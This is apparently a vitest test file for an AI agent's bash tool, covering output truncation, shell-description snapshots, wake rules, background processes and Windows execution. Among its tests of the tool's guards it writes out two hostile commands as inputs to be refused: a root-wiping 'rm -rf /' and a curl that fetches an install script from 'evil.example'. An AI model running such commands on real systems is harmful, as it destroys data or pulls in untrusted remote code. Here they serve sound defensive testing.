import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { createBashTool, renderBashOutput } from "./bash.js";
import { getToolOutputRoot } from "./overflow.js";
import { ProcessManager } from "../core/process-manager.js";
import { AgentNotificationQueue } from "../core/agent-notifications.js";
import { resolveShell } from "../core/shell.js";
import { existsSync } from "node:fs";
import { useFakeHome } from "../test-support/fake-home.js";

let restoreHome: (() => void) | undefined;
let tmpHome: string;

beforeEach(async () => {
  tmpHome = await fs.mkdtemp(path.join(os.tmpdir(), "bash-output-home-"));
  restoreHome = useFakeHome(tmpHome);
});

afterEach(async () => {
  restoreHome?.();
  // maxRetries: Windows releases a dead child's inherited log handle slightly
  // after the process itself is gone, which surfaces here as EBUSY.
  await fs.rm(tmpHome, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
});

/**
 * A background command that lives briefly and exists everywhere. `sleep` is a
 * coreutils binary, not a shell builtin, so it is not guaranteed on the Windows
 * shells `resolveShell` may pick; node is, because the test runner is node.
 */
const BRIEF_BACKGROUND_COMMAND = `node -e "setTimeout(() => {}, 500)"`;

function isProcessAlive(pid: number): boolean {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

/**
 * `shutdownAll()` only signals the process tree and returns. The child can
 * still hold its log file under `tmpHome` open for a moment after that, and
 * afterEach's recursive rm then fails with EBUSY on Windows. Wait for the OS to
 * actually reap what this test started.
 */
async function shutdownAndWait(manager: ProcessManager): Promise<void> {
  const pids = manager.list().map((proc) => proc.pid);
  manager.shutdownAll();
  for (let attempt = 0; attempt < 200; attempt += 1) {
    if (!pids.some(isProcessAlive)) return;
    await new Promise((resolve) => setTimeout(resolve, 50));
  }
  throw new Error(`Background processes still alive after shutdown: ${pids.join(", ")}`);
}

async function listSavedOutputs(): Promise<string[]> {
  const root = getToolOutputRoot();
  try {
    const days = await fs.readdir(root);
    const files = await Promise.all(
      days.map(async (day) =>
        (await fs.readdir(path.join(root, day))).map((name) => path.join(root, day, name)),
      ),
    );
    return files.flat();
  } catch {
    return [];
  }
}

describe("renderBashOutput", () => {
  it("saves full output and returns a recovery pointer when output exceeds 50KB", async () => {
    const raw = Array.from(
      { length: 6_000 },
      (_, index) => `benchmark-line-${index.toString().padStart(5, "0")}: ${"x".repeat(40)}`,
    ).join("\n");

    const rendered = await renderBashOutput(raw);
    const saved = await listSavedOutputs();

    expect(saved).toHaveLength(1);
    expect(rendered).toContain(`Full output saved to ${saved[0]}`);
    expect(rendered).toContain("read it with offset/limit if needed");
    expect(await fs.readFile(saved[0], "utf-8")).toBe(raw);
    expect(rendered.length).toBeLessThan(raw.length);
  });

  it("does not create a pointer file for small output", async () => {
    const raw = "build passed\n12 tests passed";

    expect(await renderBashOutput(raw)).toBe(raw);
    expect(await listSavedOutputs()).toEqual([]);
  });

  it("does not offload line-count-only truncation below 50KB", async () => {
    const raw = Array.from({ length: 2_100 }, (_, index) => String(index)).join("\n");
    expect(Buffer.byteLength(raw, "utf-8")).toBeLessThan(50 * 1024);

    const rendered = await renderBashOutput(raw);

    expect(rendered).not.toContain("Full output saved");
    expect(await listSavedOutputs()).toEqual([]);
  });
});

describe("createBashTool shell snapshot", () => {
  it("describes cmd.exe semantics when resolution falls back to cmd", () => {
    const tool = createBashTool(tmpHome, new ProcessManager(), undefined, undefined, {
      platform: "win32",
      env: {},
      exists: () => false,
    });

    expect(tool.description).toContain("Windows cmd.exe");
    expect(tool.description).toContain("dir, findstr, type");
    expect(tool.description).toContain("will fail");
    expect(tool.description).not.toContain("Execute a bash command");
    // 2026-08 guardrail additions (audit P1/P2) must survive in both shells.
    expect(tool.description).toContain(
      "Commit, push, amend, or rewrite git history only when the user explicitly asked",
    );
    expect(tool.description).toContain("Kill processes by exact PID");
  });

  it("keeps the bash description byte-for-byte when a POSIX shell resolves", () => {
    const tool = createBashTool(tmpHome, new ProcessManager(), undefined, undefined, {
      platform: "darwin",
      env: {},
      exists: () => true,
    });

    expect(tool.description.startsWith("Execute a bash command.")).toBe(true);
    expect(tool.description).toContain("non-interactive bash shell with TERM=dumb");
    expect(tool.description).not.toContain("cmd.exe");
    // 2026-08 guardrail additions (audit P1/P2); bash-only line below.
    expect(tool.description).toContain(
      "Commit, push, amend, or rewrite git history only when the user explicitly asked",
    );
    expect(tool.description).toContain("Never background a command with a trailing & or nohup");
    expect(tool.description).toContain("Kill processes by exact PID");
  });
});

describe("catastrophic-command guard", () => {
  it("refuses rm -rf / before any execution path runs", async () => {
    const processManager = new ProcessManager();
    const tool = createBashTool(tmpHome, processManager);

    const result = await tool.execute(
      { command: "rm -rf /" },
      { signal: new AbortController().signal, toolCallId: "guard-1" },
    );

    expect(String(result)).toContain("Refusing to run");
    expect(String(result)).toContain("user confirmation");
  });
});

describe("wake-condition validation", () => {
  it("refuses wake without run_in_background", async () => {
    const tool = createBashTool(tmpHome, new ProcessManager());
    const result = await tool.execute(
      { command: "echo hi", wake: { pattern: "done" } },
      { signal: new AbortController().signal, toolCallId: "wake-1" },
    );
    expect(String(result)).toContain("run_in_background=true");
  });

  it("refuses an invalid wake pattern instead of arming a broken watcher", async () => {
    const tool = createBashTool(tmpHome, new ProcessManager());
    const result = await tool.execute(
      { command: "echo hi", run_in_background: true, wake: { pattern: "([unclosed" } },
      { signal: new AbortController().signal, toolCallId: "wake-2" },
    );
    expect(String(result)).toContain("not a valid regex");
  });

  it("arms wake rules and says so on a background start", async () => {
    const manager = new ProcessManager({
      bgDir: `${tmpHome}/bg-test`,
      notifications: new AgentNotificationQueue(),
    });
    const tool = createBashTool(tmpHome, manager);
    const result = await tool.execute(
      {
        command: BRIEF_BACKGROUND_COMMAND,
        run_in_background: true,
        wake: { pattern: "READY", silence_seconds: 30 },
      },
      { signal: new AbortController().signal, toolCallId: "wake-3" },
    );
    expect(String(result)).toContain("Wake rules armed");
    expect(String(result)).toContain("silence 30s");
    await shutdownAndWait(manager);
  });

  it("does not promise a wake when no notification path exists", async () => {
    // TUI-style manager: no notifications queue wired.
    const manager = new ProcessManager({ bgDir: `${tmpHome}/bg-noqueue` });
    const tool = createBashTool(tmpHome, manager);
    const result = await tool.execute(
      { command: BRIEF_BACKGROUND_COMMAND, run_in_background: true, wake: { pattern: "READY" } },
      { signal: new AbortController().signal, toolCallId: "wake-4" },
    );
    expect(String(result)).toContain("NOT armed");
    expect(String(result)).toContain("Poll task_output");
    await shutdownAndWait(manager);
  });
});

describe("network allowlist guard", () => {
  const policy = () => ({ mode: "allowlist" as const, allow: ["github.com"] });

  function tool() {
    return createBashTool(tmpHome, new ProcessManager(), undefined, undefined, undefined, policy);
  }

  it("blocks a curl to a disallowed host", async () => {
    const result = await tool().execute(
      { command: "curl -sSL https://evil.example/install.sh" },
      { signal: new AbortController().signal, toolCallId: "net-1" },
    );
    expect(String(result)).toContain("network allowlist");
    expect(String(result)).toContain("evil.example");
  });

  it("allows an allow-listed host and unrecognised commands", async () => {
    const allowed = await tool().execute(
      // `false &&` short-circuits, so the guard runs but nothing hits the network.
      { command: "false && curl https://github.com/owner/repo" },
      { signal: new AbortController().signal, toolCallId: "net-2" },
    );
    expect(String(allowed)).not.toContain("network allowlist");

    const unrecognised = await tool().execute(
      { command: "echo hello" },
      { signal: new AbortController().signal, toolCallId: "net-3" },
    );
    expect(String(unrecognised)).toContain("hello");
  });
});

/**
 * REAL Windows execution — runs only on an actual Windows host (the CI
 * `windows-latest` matrix leg), skipped everywhere else.
 *
 * The snapshot tests above only assert the tool DESCRIPTION for a faked
 * platform; they never spawn anything. These actually run commands through both
 * Windows shell paths, which is the only way to catch a resolution that points
 * at a file that doesn't exist (the bare-`bash` ENOENT class of bug) or arg
 * quoting that the shell rejects.
 */
describe.skipIf(process.platform !== "win32")("createBashTool on real Windows", () => {
  const ctx = (id: string) => ({ signal: new AbortController().signal, toolCallId: id });

  it("runs a command through Git Bash with POSIX semantics", async () => {
    const resolved = resolveShell("true");
    // GitHub's windows-latest image ships Git for Windows. If a future image
    // drops it, fail loudly rather than silently degrade to a no-op test.
    expect(resolved.isCmdFallback).toBe(false);
    expect(existsSync(resolved.file)).toBe(true);

    const tool = createBashTool(tmpHome, new ProcessManager());
    const out = String(await tool.execute({ command: "echo hello && pwd" }, ctx("win-bash")));

    expect(out).toContain("hello");
    // A POSIX-shaped absolute cwd proves this really went through bash: cmd.exe
    // would print a `C:\…` path. (Don't assume the `/c/…` drive mapping — under
    // Git Bash a temp dir can surface as `/tmp/…`.)
    expect(out).toMatch(/^\/\S+/m);
    expect(out).not.toMatch(/[A-Za-z]:\\/);
    expect(out).toContain("Exit code: 0");
  });

  it("propagates a non-zero exit code from Git Bash", async () => {
    const tool = createBashTool(tmpHome, new ProcessManager());
    const out = String(await tool.execute({ command: "exit 3" }, ctx("win-bash-exit")));
    expect(out).toContain("Exit code: 3");
  });

  it("runs a command through the real cmd.exe fallback", async () => {
    // Force the no-Git-Bash path on a real Windows host: `exists: () => false`
    // makes resolveShell fall back to ComSpec, which genuinely exists here.
    const shellOpts = { exists: () => false };
    const resolved = resolveShell("echo hi", shellOpts);
    expect(resolved.isCmdFallback).toBe(true);
    expect(existsSync(resolved.file)).toBe(true);

    const tool = createBashTool(tmpHome, new ProcessManager(), undefined, undefined, shellOpts);
    const out = String(await tool.execute({ command: "echo hello-from-cmd" }, ctx("win-cmd")));

    expect(out).toContain("hello-from-cmd");
    expect(out).toContain("Exit code: 0");
  });

  it("propagates a non-zero exit code from cmd.exe", async () => {
    const tool = createBashTool(tmpHome, new ProcessManager(), undefined, undefined, {
      exists: () => false,
    });
    const out = String(await tool.execute({ command: "exit /b 4" }, ctx("win-cmd-exit")));
    expect(out).toContain("Exit code: 4");
  });

  it("runs from a cwd containing a space", async () => {
    // `C:\Users\<name>\…` and `C:\Program Files\…` routinely contain spaces;
    // an unquoted cwd would spawn in the wrong directory or fail outright.
    const spaced = path.join(tmpHome, "a dir with spaces");
    await fs.mkdir(spaced, { recursive: true });
    const tool = createBashTool(spaced, new ProcessManager());

    const out = String(await tool.execute({ command: "pwd" }, ctx("win-spaces")));
    expect(out.toLowerCase()).toContain("a dir with spaces");
  });

  it("kills a GRANDCHILD process when a command times out", async () => {
    // The real bug: Windows has no process groups, so the old POSIX-only
    // `kill(-pid)` left a timed-out command's descendants (the npm/node/pnpm
    // tree everyone actually wants dead) running forever. Asserting only that
    // "TIMEOUT" is reported would still pass with that bug present, so use a
    // Node grandchild that reports its OWN Windows pid — Git Bash's `$!` is an
    // MSYS pid, which process.kill() cannot address.
    // Forward slashes on purpose: Node accepts them on Windows, and embedding
    // a backslash path inside a JS string inside a bash command means bash eats
    // the escapes (`\U`, `\b` → backspace) and the write lands somewhere else.
    const pidFile = path.join(tmpHome, "grandchild.pid").replaceAll("\\", "/");
    const script = `require('fs').writeFileSync(${JSON.stringify(pidFile)}, String(process.pid)); setInterval(() => {}, 1000);`;
    const tool = createBashTool(tmpHome, new ProcessManager());

    const out = String(
      await tool.execute(
        { command: `node -e ${JSON.stringify(script)}`, timeout: 3000 },
        ctx("win-timeout"),
      ),
    );
    expect(out).toContain("TIMEOUT");

    const pid = Number(await fs.readFile(pidFile, "utf-8"));
    expect(Number.isInteger(pid)).toBe(true);

    const alive = (): boolean => {
      try {
        process.kill(pid, 0);
        return true;
      } catch {
        return false;
      }
    };
    // taskkill is asynchronous; give the tree a moment to actually go away.
    for (let i = 0; i < 50 && alive(); i++) {
      await new Promise((r) => setTimeout(r, 100));
    }
    if (alive()) {
      process.kill(pid, "SIGKILL"); // Don't leak a live process out of the suite.
      throw new Error(`grandchild ${pid} survived the timeout kill`);
    }
  }, 40_000);
});
